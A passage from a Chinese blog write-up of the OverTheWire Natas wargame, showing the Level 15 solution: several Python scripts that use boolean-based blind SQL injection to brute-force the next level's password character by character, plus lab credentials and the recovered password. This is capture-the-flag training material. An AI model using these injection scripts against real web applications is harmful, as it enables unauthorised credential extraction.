存储已对应正确位置的部分密码段，<code>char</code> 则赋值当前猜想字符。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">chars = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">filtered = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 用于存储符合条件的字符</span></span><br><span class="line">passwd = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 用于存储密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次循环用于获取符合条件的字符</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">    <span class="comment"># 构造查询条件</span></span><br><span class="line">    Data = &#123;<span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;natas16&quot; and password LIKE BINARY &quot;%&#x27;</span> + char + <span class="string">&#x27;%&quot; #&#x27;</span>&#125;</span><br><span class="line">    <span class="comment"># 发送POST请求并使用HTTP基本身份验证</span></span><br><span class="line">    r = requests.post(<span class="string">&#x27;http://natas15.natas.labs.overthewire.org/index.php?debug&#x27;</span>, auth=HTTPBasicAuth(<span class="string">&#x27;natas15&#x27;</span>, <span class="string">&#x27;AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J&#x27;</span>), data = Data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;exists&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        filtered = filtered + char  <span class="comment"># 将符合条件的字符添加到filtered列表中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次循环用于逐个获取密码的字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> filtered:</span><br><span class="line">        <span class="comment"># 构造查询条件</span></span><br><span class="line">        Data = &#123;<span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;natas16&quot; and password LIKE BINARY &quot;&#x27;</span> + passwd + char + <span class="string">&#x27;%&quot; #&#x27;</span>&#125;</span><br><span class="line">        <span class="comment"># 发送POST请求并使用HTTP基本身份验证</span></span><br><span class="line">        r = requests.post(<span class="string">&#x27;http://natas15.natas.labs.overthewire.org/index.php?debug&#x27;</span>, auth=HTTPBasicAuth(<span class="string">&#x27;natas15&#x27;</span>, <span class="string">&#x27;AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J&#x27;</span>), data = Data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;exists&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            passwd = passwd + char  <span class="comment"># 将密码字符添加到passwd变量中</span></span><br><span class="line">            <span class="built_in">print</span>(passwd)  <span class="comment"># 打印当前已获取的密码字符</span></span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/fe7b28406773d542615fb45a86dbd2046ff.png" alt="image-20230802232841423"></p><ul><li>既然理解了，那就调教您的 AI。</li><li>P.S.弹窗输入框登录，即该页面采用了基本的 HTTP 身份验证（Basic Authentication）。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">访问http://natas15.natas.labs.overthewire.org/index.php时会出现一个弹窗输入框，是用来输入账号密码的，请结合如下信息编写一个python脚本获取响应数据：</span></span><br><span class="line"><span class="string">url = &#x27;http://natas15.natas.labs.overthewire.org/index.php&#x27;</span></span><br><span class="line"><span class="string">username = &#x27;natas15&#x27;</span></span><br><span class="line"><span class="string">password = &#x27;TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置的URL、用户名和密码</span></span><br><span class="line">url = <span class="string">&#x27;http://natas15.natas.labs.overthewire.org/index.php&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;natas15&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求</span></span><br><span class="line">response = requests.post(url, auth=(username, password))</span><br><span class="line"></span><br><span class="line"><span class="comment">#响应内容</span></span><br><span class="line">content = response.text</span><br><span class="line"><span class="built_in">print</span>(content)  <span class="comment"># 可以根据需要对响应内容进行处理</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/be375bca8e3d448c4e6e6d712ecdd9e7a49.png" alt="image-20230802214156474"></p><ul><li>添加post请求体，记得改查询账号为natas16</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求的URL、用户名和密码</span></span><br><span class="line">url = <span class="string">&#x27;http://natas15.natas.labs.overthewire.org/index.php&#x27;</span>  <span class="comment"># 请求的URL</span></span><br><span class="line">username = <span class="string">&#x27;natas15&#x27;</span>  <span class="comment"># 用户名</span></span><br><span class="line">password = <span class="string">&#x27;TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB&#x27;</span>  <span class="comment"># 密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置请求体数据</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;natas16&#x27;</span>  <span class="comment"># 键为&#x27;username&#x27;，值为&#x27;natas16&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用requests库的post方法发送POST请求，并携带认证信息和请求体数据</span></span><br><span class="line">response = requests.post(url, auth=(username, password), data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 响应中获取文本内容</span></span><br><span class="line">content = response.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将响应内容打印出来</span></span><br><span class="line"><span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure><ul><li>查询密码串中的可能存在的字符，单个语句测试</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置请求的URL、用户名和密码</span></span><br><span class="line">url = <span class="string">&#x27;http://natas15.natas.labs.overthewire.org/index.php&#x27;</span>  <span class="comment"># 请求的URL</span></span><br><span class="line">username = <span class="string">&#x27;natas15&#x27;</span>  <span class="comment"># 用户名</span></span><br><span class="line">password = <span class="string">&#x27;TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB&#x27;</span>  <span class="comment"># 密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求体数据</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;natas16&quot;and password like binary &quot;%a%&quot;-- &#x27;</span>  <span class="comment"># 向服务器发送的POST请求数据，其中包含了一个SQL注入攻击的字符串</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求</span></span><br><span class="line">response = requests.post(url, auth=(username, password),data=data  <span class="comment"># 使用requests库的post方法发送POST请求，并携带认证信息和请求体数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取响应内容</span></span><br><span class="line">content = response.text  <span class="comment"># 从响应中获取文本内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印响应内容</span></span><br><span class="line"><span class="built_in">print</span>(content)  <span class="comment"># 可以根据需要对响应内容进行进一步处理，这里将其直接印出来</span></span><br></pre></td></tr></table></figure><ul><li>for 语句循环密码串所含字符，要等挺久的</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置请求的URL、用户名和密码</span></span><br><span class="line">url = <span class="string">&#x27;http://natas15.natas.labs.overthewire.org/index.php&#x27;</span>  <span class="comment"># 请求的URL</span></span><br><span class="line">username = <span class="string">&#x27;natas15&#x27;</span>  <span class="comment"># 用户名</span></span><br><span class="line">password = <span class="string">&#x27;TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB&#x27;</span>  <span class="comment"># 密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要搜索的字符集合，密码本</span></span><br><span class="line">string = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存存在于密码中的字符</span></span><br><span class="line">exist = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环遍历字符集合</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造SQL注入字符串并发送请求</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;natas16&quot;and password like binary &quot;%&#x27;</span> + char + <span class="string">&#x27;%&quot;-- &#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, auth=(username, password), data=data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取响应内容</span></span><br><span class="line">    content = response.text</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断响应内容中是否含有 &quot;exists 来确定字符是否在密码中存在</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;exists&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">        exist += char</span><br><span class="line">        <span class="built_in">print</span>(exist)  <span class="comment"># 输出密码中存在字符</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/dd5aa4feba1e27d532713eb9301eb2cded2.png" alt="image-20230802233839993"></p><ul><li>两层 for 循环爆破密码（32位），第一层遍历密码的每一位，第二层遍历密码当前位的正确字符。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://natas15.natas.labs.overthewire.org/index.php&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;natas15&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB&#x27;</span></span><br><span class="line">string = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">exist = <span class="string">&#x27;&#x27;</span></span><br><span class="line">passwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历字符集合，检查每个字符是否存在于密码中的某一位</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">    <span class="comment"># 构造请求体数据，使用SQL注入语句判断密码中的某一位是否为当前字符</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;natas16&quot; and password like binary &quot;%&#x27;</span> + char + <span class="string">&#x27;%&quot;-- &#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送POST请求，检查是否存在返回结果存在的提示</span></span><br><span class="line">    response = requests.post(url, auth=(username, password), data=data)</span><br><span class="line">    content = response.text</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果返回结果存在提示，则将当前字符添加到已知存在的字符集合中</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;exists&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">        exist += char</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(exist)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 枚举密码的每一位</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">    <span class="comment"># 遍历已知存在的字符集合</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> exist:</span><br><span class="line">        <span class="comment"># 构造请求体数据，使用已知的密码部分和已知存在的字符判断密码的下一位可能的取值</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;natas16&quot; and password like binary &quot;&#x27;</span> + passwd + char + <span class="string">&#x27;%&quot;-- &#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 发送POST请求，检查是否存在返回结果存在的提示</span></span><br><span class="line">        response = requests.post(url, auth=(username, password), data=data)</span><br><span class="line">        content = response.text</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果返回结果存在提示，则将当前字符添加到密码中，并打印更新后的密码</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;exists&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">            passwd += char</span><br><span class="line">            <span class="built_in">print</span>(passwd)</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/b110c69a4c24cc8a64ccb6957668198e975.png" alt="image-20230803221455608"></p><ul><li>函数封装</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://natas15.natas.labs.overthewire.org/index.php&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;natas15&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB&#x27;</span></span><br><span class="line">string = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_existing_chars</span>(<span class="params">url=url, username=username, password=password, string=string</span>):</span><br><span class="line">    <span class="comment"># 打印密码表塔</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;密码表塔：&#x27;</span>)</span><br><span class="line">    exist = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;natas16&quot;and password like binary &quot;%&#x27;</span> + char + <span class="string">&#x27;%&quot;-- &#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 发送POST请求</span></span><br><span class="line">        response = requests.post(url, auth=(username, password), data=data)</span><br><span class="line">        content = response.text</span><br><span class="line">        <span class="comment"># 检查响应内容中是否包含&quot;exists&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;exists&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">            <span class="comment"># 将存在的字符添加到已有字符集合中</span></span><br><span class="line">            exist += char</span><br><span class="line">            <span class="built_in">print</span>(exist)</span><br><span class="line">    <span class="keyword">return</span> exist</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bruteforce_password</span>(<span class="params">url=url, username=username, password=password, exist=string</span>):</span><br><span class="line">    <span class="comment"># 打印密码塔</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;密码塔：&#x27;</span>)</span><br><span class="line">    passwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 预计密码长度为32位，因此循环32次</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> exist:</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;natas16&quot;and password like binary &quot;&#x27;</span>+passwd+char+<span class="string">&#x27;%&quot;-- &#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># 发送POST请求</span></span><br><span class="line">            response = requests.post(url, auth=(username, password),data=data)</span><br><span class="line">            content = response.text</span><br><span class="line">            <span class="comment"># 检查响应内容中是否包含&quot;exists&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;exists&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">                <span class="comment"># 将找到的字符添加到密码中</span></span><br><span class="line">                passwd += char</span><br><span class="line">                <span class="built_in">print</span>(passwd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数bruteforce_password，传入find_existing_chars函数的返回值作为参数</span></span><br><span class="line">bruteforce_password(exist=find_existing_chars())</span><br></pre></td></tr></table></figure><ul><li>TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/c117ee76958983a31cf051f08030aacb0d2.png" alt="image-20230803231008073"></p></div><div class="post-copyright-info"><div class="article-copyright-info-container"><ul class="copyright-info-content"><li><span class="type">本文标题</span>：<span class="content">Natas 0 to 15 for Wargames</span></li><li><span class="type">本文作者</span>：<span class="content">涂寐</span></li><li><span class="type">创建时间</span>：<span class="content">2023-09-14 23:43:57</span></li><li class="post-link"><span class="type">本文链接</span>：<span class="content">article/94527e84.html</span></li><li><span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span></li></ul></div></div><ul class="post-tags-box"><li class="tag-item"><a href="/tags/essay/">#随笔</a>&nbsp;</li><li class="tag-item"><a href="/tags/success/">#通关</a>&nbsp;</li></ul><div class="article-nav"><div class="article-next"><a class="next" rel="next" href="/article/c8476f93.html"><span class="title flex-center"><span class="post-nav-title-item">QQ 客户端远程代码执行漏洞</span> <span class="post-nav-item">下一篇</span> </span><span class="right arrow-icon flex-center"><i class="fas fa-chevron-right"></i></span></a></div></div><div class="comment-container"><div class="comments-container"><div id="comments-anchor"></div><div class="comment-area-title"><i class="fas fa-comments"></i>&nbsp;评论</div><div class="valine-container"><script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><div id="vcomments"></div><script data-pjax>function loadValine(){function e(e){switch(e){case"en":return"Author";case"zh-CN":return"博主";default:return"Master"}}new Valine({el:"#vcomments",appId:"FrcGiaBdfMQqXAnDFY1gwHbS-gzGzoHsz",appKey:"C0Wy6Sfq0qVag0nm59fc1D12",meta:["nick","mail","link"],avatar:"wavatar",enableQQ:!0,placeholder:"道友，请留步！请留言~",lang:"zh-CN".toLowerCase()});const a=setInterval(()=>{const n=document.querySelectorAll("#vcomments .vcards .vcard");if(n.length>0){let t="涂寐";if(t)for(let a of n){const n=a.querySelector(".vhead .vnick"),l=n.innerHTML;l===t&&(n.innerHTML=`${l} <span class="author">${e(KEEP.hexo_config.language)}</span>`)}clearInterval(a)}else clearInterval(a)},2e3)}{const e=setTimeout(()=>{loadValine(),clearTimeout(e)},1e3)}</script></div></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-0%E2%80%94%E2%80%94%E7%BD%91%E9%A1%B5%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="nav-number">1.</span> <span class="nav-text">Level 0——网页源代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-1%E2%80%94%E2%80%94%E7%BD%91%E9%A1%B5%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="nav-number">2.</span> <span class="nav-text">Level 1——网页源代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-2%E2%80%94%E2%80%94%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-number">3.</span> <span class="nav-text">Level 2——目录遍历</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-3%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-robots-txt"><span class="nav-number">4.</span> <span class="nav-text">Level 3——文件泄露-robots.txt</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-4%E2%80%94%E2%80%94referer-%E6%AC%BA%E9%AA%97"><span class="nav-number">5.</span> <span class="nav-text">Level 4——referer 欺骗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-5%E2%80%94%E2%80%94%E8%B6%8A%E6%9D%83-cookie"><span class="nav-number">6.</span> <span class="nav-text">Level 5——越权-cookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-6%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2-%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="nav-number">7.</span> <span class="nav-text">Level 6——源码泄露-文件泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-7%E2%80%94%E2%80%94%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">8.</span> <span class="nav-text">Level 7——本地文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-8%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2-%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98"><span class="nav-number">9.</span> <span class="nav-text">Level 8——源码泄露-编码问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-9%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">10.</span> <span class="nav-text">Level 9——命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-10%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="nav-number">11.</span> <span class="nav-text">Level 10——命令执行绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-11%E2%80%94%E2%80%94%E5%BC%82%E6%88%96%E8%A7%A3%E7%A0%81"><span class="nav-number">12.</span> <span class="nav-text">Level 11——异或解码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-12%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%9B%B4%E6%94%B9%E9%BB%98%E8%AE%A4%E5%90%8E%E7%BC%80"><span class="nav-number">13.</span> <span class="nav-text">Level 12——文件上传-更改默认后缀</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-13%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%9B%B4%E6%94%B9%E6%96%87%E4%BB%B6%E9%BB%98%E8%AE%A4%E7%AD%BE%E5%90%8D"><span class="nav-number">14.</span> <span class="nav-text">Level 13——文件上传-更改文件默认签名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-14%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5-%E5%8F%8C%E5%BC%95%E5%8F%B7%E6%8A%A5%E9%94%99-%E7%99%BB%E5%BD%95%E6%A1%86"><span class="nav-number">15.</span> <span class="nav-text">Level 14——sql注入-双引号报错-登录框</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-15%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5-%E5%8F%8C%E5%BC%95%E5%8F%B7%E6%8A%A5%E9%94%99-%E6%9F%A5%E8%AF%A2%E6%A1%86-%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5"><span class="nav-number">16.</span> <span class="nav-text">Level 15——sql注入-双引号报错-查询框-布尔注入</span></a></li></ol></div></div></div></div></div></div></div><div class="page-main-content-bottom"><footer class="footer"><div class="info-container"><div class="copyright-info info-item">&copy; <span>2021</span> - 2023 &nbsp;<i class="fas fa-heart icon-animate" style="color:red"></i> &nbsp;<a href="/">涂寐</a></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="website-count info-item"></div><div class="theme-info info-item">由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a></div><script id="LA-DATA-WIDGET" crossorigin="anonymous" charset="UTF-8" 